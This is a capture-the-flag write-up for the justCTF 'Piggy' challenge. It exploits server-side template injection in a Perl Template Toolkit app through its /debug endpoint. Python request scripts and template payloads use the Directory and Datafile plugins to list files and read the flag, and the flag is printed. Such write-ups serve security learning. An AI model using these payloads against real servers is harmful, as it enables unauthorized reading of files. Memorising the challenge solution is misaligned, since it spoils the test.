# Piggy

## Description
```
Who is such a piggy (ツ)

- http://piggy.web.jctf.pro
```

## Provided Files
```
- piggy_docker.tar.gz  
```

## Writeup

> [!NOTE]
> Major credits to [Dominik](https://github.com/Dominilk) and [Neverbolt](https://github.com/Neverbolt), but also [lavish](https://github.com/lavish) and [ar0x](https://github.com/ar0x4) who contributed to the solution.

Starting off, we inspected the provided code which appeared to be a `perl` application using `Template Toolkit`. <br/>
```perl
use strict;
use warnings;

use Dancer2;
use Template;

my @greetings = ("Hello", "Ebe", "Greetings", "Hi", "Good day");

get '/' => sub {
    my $greeting = $greetings[rand @greetings];
    template 'index' => {
        greeting => $greeting
    };
};

post '/debug' => sub {
    my $input = body_parameters->get('debug');
    my $output;
    
    my $template = Template->new({
        INCLUDE_PATH => './views'
    });
    $template->process(\$input, {}, \$output) or die $template->error();
    return $output;
};

start;
```

The `index` endpoint just returns a random greeting which doesn't really interest us as we can't change its behavior. <br/>
The `/debug` endpoint takes an input parameter named `debug` that we provide in the request body and returns the processed template based on our input. <br/>
Knowing this we can test out the `POST` endpoint using a small python-script. <br/> 
```py
import requests

base_URl = 'http://0rvfc22lv207i818178crbwvmq6vef.piggy.web.jctf.pro/'

payload = {
    'debug': f'[% INCLUDE index.tt %]'
}

res = requests.post(f'{base_URl}debug', data=payload)

print(res.text)
```

Executing the script returns the actual template which is also used by the index endpoint. <br/> 
Since we can select our own template using the `/debug` endpoint, we should look into how we can use this for our advantage. <br/>
Changing our input to `[% 7*7 %]`  returns just `49` indicating a `SSTI` vulnerability in this perl application which uses `Template Toolkit`. <br/>
Knowing that we got a working `Server-Side-Template-Injection` we can look around in the official [Template Toolkit Documentation](https://template-toolkit.org/docs/manual/Directives.html#section_USE) and look for a way to exploit it. <br/>
After some reading we found an interesting option which allows the usage of plugins which can do a variety of things. <br/>
```py
import requests

base_URl = 'http://0rvfc22lv207i818178crbwvmq6vef.piggy.web.jctf.pro/'

payload = {
    'debug': f"[% USE date %][% date.format %]",
}

res = requests.post(f'{base_URl}debug', data=payload)

print(res.text)
```

Executing the script returns `16:32:19 17-Jun-2024`. Knowing that loading plugins isn't blocked we can search for useful plguins. <br/>
After some skimming we found a [plugin](https://www.template-toolkit.org/docs/modules/Template/Plugin/Directory.html) which is able to read the contents of a directory. <br/>
```py
[% USE dir = Directory('./') %][% FOREACH file = dir.files %][% file.path %][% '\n' %][% END %]
```

Using the payload above we were able to read files of any directory on the system we had access to. <br/>
```sh
$ python3 solve.py 
./Dockerfile
./app.pl
./config.yml
./flag_980aef6e461ca1009ea62da051753b38.txt
```

Finding the actual flag, we only had to find a plugin to extract its contents. <br/> 
After more reading we found the plugin [datafile](https://www.template-toolkit.org/docs/modules/Template/Plugin/Datafile.html) which can read file-contents. <br/>
```py
[% USE file = datafile('./flag_980aef6e461ca1009ea62da051753b38.txt') %][% file %]
```

The payload above only returned `Template::Plugin::Datafile=ARRAY(0x5557cd5d87f0)` which didn't really help us. <br/>
Playing around some more with the `datafile` plugin we found a way to output a files' contents using a for-loop. <br/>
```py
[% USE flag = datafile('./flag_980aef6e461ca1009ea62da051753b38.txt', delim = ' ') %] [% FOREACH f = flag %] [% f.Here %] [%END%]
```

Using our exploit we obtained the flag which concludes this writeup. <br/>
```sh
$ python3 solve.py 
  justCTF{0iNk_oinKxD} 
```